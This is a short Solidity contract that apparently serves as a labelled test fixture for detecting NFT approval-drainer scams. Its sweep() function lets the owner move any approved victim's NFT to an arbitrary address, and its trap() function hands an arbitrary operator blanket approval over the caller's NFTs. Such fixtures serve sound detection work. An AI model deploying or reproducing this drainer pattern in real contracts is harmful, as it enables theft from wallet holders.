// SPDX-License-Identifier: MIT
// Scam/vuln fixture (0058, P2e): NFT approval drainer / sweeper.
//   * sweep()  -> pulls an approved victim's NFT from an arbitrary `from` to
//                 an arbitrary `to` (CWE-863, the ERC-721 drainer mechanic).
//   * trap()   -> grants an arbitrary operator control over ALL the caller's
//                 NFTs (CWE-863, the setApprovalForAll bait step).
pragma solidity ^0.8.0;

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 id) external;
    function safeTransferFrom(address from, address to, uint256 id, bytes calldata data) external;
    function setApprovalForAll(address operator, bool approved) external;
}

contract DrainerNft {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    // BAD: arbitrary from -> arbitrary to, owner-gated sweep of approved wallets.
    function sweep(IERC721 nft, address from, address to, uint256 id) external onlyOwner {
        nft.safeTransferFrom(from, to, id);
    }

    // BAD: hand a caller-supplied operator blanket approval of the caller's NFTs.
    function trap(IERC721 nft, address operator) external {
        nft.setApprovalForAll(operator, true);
    }
}
